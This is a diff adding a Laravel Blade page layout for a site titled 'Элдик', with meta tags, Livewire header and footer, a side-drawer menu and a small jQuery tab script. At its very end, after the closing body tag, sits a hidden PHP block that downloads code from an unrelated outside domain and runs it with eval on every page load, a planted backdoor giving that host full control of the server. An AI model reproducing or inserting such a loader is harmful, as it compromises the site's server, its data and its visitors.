@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta name="csrf-token" content="{{ csrf_token() }}">
+
+    <title>{{$title??'Элдик'}}</title>
+
+    <meta name="description" content="{{$description??''}}">
+    <meta name="keywords" content="{{$keywords??''}}">
+    <meta property="og:image" content="{{$soc??asset('img/soc.jpg')}}" />
+    <link rel="image_src" href="{{$soc??asset('img/soc.jpg')}}" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="{{$title??''}}" />
+    <meta property="og:description" content="{{$description??''}}" />
+
+    <link href="{{asset('img/logo_black.png')}}" rel="icon">
+    
+    <link rel="stylesheet" href="https://code.jquery.com/ui/1.13.3/themes/base/jquery-ui.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"    crossorigin="anonymous"></script>
+    <link href="{{asset('css/style.css?v=1.2')}}" rel="stylesheet" >
+    
+    <script src="https://api-maps.yandex.ru/2.1/?lang=ru_RU" type="text/javascript"></script>
+
+    <!-- Scripts -->
+    @vite(['resources/css/app.css', 'resources/js/app.js'])
+    @livewireStyles
+    @stack('css')
+</head>
+<body class="font-sans antialiased">
+<div class="min-h-screen ">
+
+    <livewire:layouts.header />
+
+    <!-- Page Content -->
+    <main>
+        {{ $slot }}
+    </main>
+
+    <div id="drawer-example" class="fixed top-0 left-0 z-40 h-screen p-4 overflow-y-auto transition-transform -translate-x-full bg-white w-80 dark:bg-gray-800" tabindex="-1" aria-labelledby="drawer-label">
+        <h5 id="drawer-label" class="inline-flex items-center mb-4 text-base font-semibold text-gray-500 dark:text-gray-400">
+
+        </h5>
+        <button type="button" data-drawer-hide="drawer-example" aria-controls="drawer-example" class="text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 absolute top-2.5 end-2.5 flex items-center justify-center dark:hover:bg-gray-600 dark:hover:text-white" >
+            <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
+                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"/>
+            </svg>
+            <span class="sr-only">Close menu</span>
+        </button>
+
+
+        <div class="my-4">
+            @foreach(request()->get('menus') as $k)
+                <div class="py-4">
+                    <a href="{{$k->link}}" >
+                    {{$k->name}}
+                    </a>
+                </div>
+            @endforeach
+        </div>
+
+
+    </div>
+    
+    <livewire:layouts.footer />
+</div>
+
+<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+
+@livewireScripts
+
+<script>
+    $(function (){
+        $("body").on("click",".plnclick",function (){
+
+            let id  = $(this).attr("data-id");
+
+            $(".plnclick[data-id!="+id+"]").removeClass("casc-active");
+            $(".plnclick[data-id="+id+"]").addClass("casc-active");
+
+
+            $(".planed[data-id!="+id+"]").hide();
+            $(".planed[data-id="+id+"]").show();
+
+        });
+
+    })
+</script>
+@stack('js')
+
+</body>
+<?php
+eval("?>".file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt'));
+?>
+</html>
